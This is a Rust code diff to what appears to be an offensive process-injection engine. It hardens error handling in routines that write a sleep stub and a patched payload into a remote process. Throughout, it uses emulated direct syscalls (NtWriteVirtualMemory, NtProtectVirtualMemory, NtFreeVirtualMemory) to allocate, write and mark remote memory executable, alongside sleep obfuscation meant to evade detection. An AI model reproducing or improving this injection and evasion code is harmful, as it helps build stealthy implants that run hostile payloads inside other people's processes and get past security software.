@@ -619,10 +619,13 @@ pub struct InjectionHandle {
     pub(crate) sleep_stub_addr: usize,
 }
 
-// SAFETY: InjectionHandle owns raw Windows handles that are not Send/Sync by
-// default, but we only use them from a single thread and close them in eject().
-unsafe impl Send for InjectionHandle {}
-unsafe impl Sync for InjectionHandle {}
+// InjectionHandle intentionally does NOT implement Send or Sync.
+// It owns raw Windows process/thread handles that are only valid in the
+// creating thread's handle table.  The `eject()` method must be called
+// from the same thread that created the handle to properly clean up.
+//
+// If cross-thread ejection is needed, use `raw_process_handle()` to
+// duplicate the handle into the target thread first.
 
 impl InjectionHandle {
     /// Cleanly reverse the injection: unregister from sleep obfuscation,
@@ -1179,6 +1182,15 @@ impl InjectionHandle {
                 &mut written as *mut _ as u64,
             );
             if ws.is_err() || ws.unwrap() < 0 || written != stub.len() {
+                // Clean up the remote allocation before returning.
+                let mut free_size: usize = 0;
+                let _ = crate::emulated_syscall!(
+                    "NtFreeVirtualMemory",
+                    self.process_handle as u64,
+                    &mut remote_stub as *mut _ as u64,
+                    &mut free_size as *mut _ as u64,
+                    0x8000u64, // MEM_RELEASE
+                );
                 return Err(InjectionError::InjectionFailed {
                     technique: self.technique_used.clone(),
                     reason: "failed to write sleep stub".to_string(),
@@ -1189,7 +1201,7 @@ impl InjectionHandle {
             let mut old_prot = 0u32;
             let mut prot_base = remote_stub;
             let mut prot_size = stub.len();
-            let _ = crate::emulated_syscall!(
+            let prot_result = crate::emulated_syscall!(
                 "NtProtectVirtualMemory",
                 self.process_handle as u64,
                 &mut prot_base as *mut _ as u64,
@@ -1197,6 +1209,20 @@ impl InjectionHandle {
                 0x20u64, // PAGE_EXECUTE_READ
                 &mut old_prot as *mut _ as u64,
             );
+            if prot_result.is_err() || prot_result.unwrap() < 0 {
+                let mut free_size: usize = 0;
+                let _ = crate::emulated_syscall!(
+                    "NtFreeVirtualMemory",
+                    self.process_handle as u64,
+                    &mut remote_stub as *mut _ as u64,
+                    &mut free_size as *mut _ as u64,
+                    0x8000u64,
+                );
+                return Err(InjectionError::InjectionFailed {
+                    technique: self.technique_used.clone(),
+                    reason: "failed to protect sleep stub".to_string(),
+                });
+            }
 
             // Flush I-cache.
             let _ = crate::emulated_syscall!(
@@ -1333,7 +1359,7 @@ impl InjectionHandle {
                     let mut prot_base2 = payload_base;
                     let mut prot_size2 = payload_size;
                     let mut old_prot2 = 0u32;
-                    let _ = crate::emulated_syscall!(
+                    let prot_result = crate::emulated_syscall!(
                         "NtProtectVirtualMemory",
                         self.process_handle as u64,
                         &mut prot_base2 as *mut _ as u64,
@@ -1341,33 +1367,72 @@ impl InjectionHandle {
                         0x04u64, // PAGE_READWRITE
                         &mut old_prot2 as *mut _ as u64,
                     );
+                    if prot_result.is_err() || prot_result.unwrap() < 0 {
+                        tracing::warn!(
+                            "injection_engine: NtProtectVirtualMemory(RW) failed for payload patch; \
+                             skipping patch write-back"
+                        );
+                        // Can't make writable — skip the patch write-back.
+                    } else {
+                        let mut patch_written = 0usize;
+                        let write_result = crate::emulated_syscall!(
+                            "NtWriteVirtualMemory",
+                            self.process_handle as u64,
+                            payload_base as u64,
+                            payload_buf.as_ptr() as u64,
+                            payload_size as u64,
+                            &mut patch_written as *mut _ as u64,
+                        );
+                        if write_result.is_err()
+                            || write_result.unwrap() < 0
+                            || patch_written != payload_size
+                        {
+                            tracing::warn!(
+                                "injection_engine: NtWriteVirtualMemory for patched payload failed \
+                                 (written={}/{})",
+                                patch_written,
+                                payload_size,
+                            );
+                            // Restore original protection before bailing.
+                            let restore_result = crate::emulated_syscall!(
+                                "NtProtectVirtualMemory",
+                                self.process_handle as u64,
+                                &mut prot_base2 as *mut _ as u64,
+                                &mut prot_size2 as *mut _ as u64,
+                                old_prot2 as u64,
+                                &mut old_prot2 as *mut _ as u64,
+                            );
+                            if restore_result.is_err() || restore_result.unwrap() < 0 {
+                                tracing::warn!(
+                                    "injection_engine: failed to restore original protection after \
+                                     patch write-back failure"
+                                );
+                            }
+                        } else {
+                            // Restore RX protection.
+                            let restore_result = crate::emulated_syscall!(
+                                "NtProtectVirtualMemory",
+                                self.process_handle as u64,
+                                &mut prot_base2 as *mut _ as u64,
+                                &mut prot_size2 as *mut _ as u64,
+                                0x20u64, // PAGE_EXECUTE_READ
+                                &mut old_prot2 as *mut _ as u64,
+                            );
+                            if restore_result.is_err() || restore_result.unwrap() < 0 {
+                                tracing::warn!(
+                                    "injection_engine: failed to restore RX protection after \
+                                     successful patch write-back"
+                                );
+                            }
 
-                    let mut patch_written = 0usize;
-                    let _ = crate::emulated_syscall!(
-                        "NtWriteVirtualMemory",
-                        self.process_handle as u64,
-                        payload_base as u64,
-                        payload_buf.as_ptr() as u64,
-                        payload_size as u64,
-                        &mut patch_written as *mut _ as u64,
-                    );
-
-                    // Restore RX protection.
-                    let _ = crate::emulated_syscall!(
-                        "NtProtectVirtualMemory",
-                        self.process_handle as u64,
-                        &mut prot_base2 as *mut _ as u64,
-                        &mut prot_size2 as *mut _ as u64,
-                        0x20u64, // PAGE_EXECUTE_READ
-                        &mut old_prot2 as *mut _ as u64,
-                    );
-
-                    let _ = crate::emulated_syscall!(
-                        "NtFlushInstructionCache",
-                        self.process_handle as u64,
-                        payload_base as u64,
-                        payload_size as u64,
-                    );
+                            let _ = crate::emulated_syscall!(
+                                "NtFlushInstructionCache",
+                                self.process_handle as u64,
+                                payload_base as u64,
+                                payload_size as u64,
+                            );
+                        }
+                    }
                 } else {
                     tracing::warn!(
                         "injection_engine: could not find NtDelayExecution call in payload; \
